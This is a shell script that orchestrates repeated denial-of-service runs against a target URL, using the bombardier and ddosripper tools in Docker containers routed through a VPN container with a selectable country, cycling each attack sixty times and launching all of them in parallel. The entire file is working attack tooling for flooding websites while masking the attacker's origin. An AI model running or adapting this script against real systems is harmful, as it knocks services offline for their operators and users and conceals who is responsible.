#!/bin/sh

bombardier()
{
    export VPN_CODE=$2
    export VPN_COUNTRY=$3
    export TARGET_URL=$1
    for i in {1..60}
    do
        echo "Running bombardier $i time. $VPN_CODE $VPN_COUNTRY $TARGET_URL"
        sudo -E docker-compose down
        sudo -E docker-compose up -d --force-recreate vpn 
        sleep 10s
        sudo -E docker-compose run test
        sudo -E docker-compose run -d bombardier
        echo "Executing..."
        sleep 10s
        id=$(sudo docker-compose ps -q ddosripper)
        sudo docker logs --since 10s $id
        sleep 120s
        sudo -E docker-compose down
    done
}

ddosripper()
{
    export VPN_CODE=$2
    export VPN_COUNTRY=$3
    export TARGET_URL=$1
    for i in {1..60}
    do
        echo "Running bombardier $i time. $VPN_CODE $VPN_COUNTRY $TARGET_URL"
        sudo -E docker-compose down
        sudo -E docker-compose up -d --force-recreate vpn 
        sleep 10s
        sudo -E docker-compose run test
        sudo -E docker-compose run -d ddosripper
        echo "Executing..."
        sleep 10s
        id=$(sudo docker-compose ps -q ddosripper)
        sudo docker logs --since 10s $id
        sleep 120s
        sudo -E docker-compose down
    done
}
checksites(){
    export VPN_CODE=$1
    export VPN_COUNTRY=$2
    for i in {1..60}
    do
        echo "Running checksites $i time. $VPN_CODE $VPN_COUNTRY"
        sudo -E docker-compose down
        sudo -E docker-compose up -d --force-recreate vpn 
        sleep 10s
        sudo -E docker-compose run test
        sudo -E docker-compose run -d checksites
        echo "Executing..."
        sleep 10s
        id=$(sudo docker-compose ps -q ddosripper)
        sudo docker logs --since 10s $id
        sleep 120s
        sudo -E docker-compose down
    done
}
all(){
    bombardier $1 $2 $3 &
    ddosripper $1 $2 $3 &
    checksites $1 $2 $3 &
}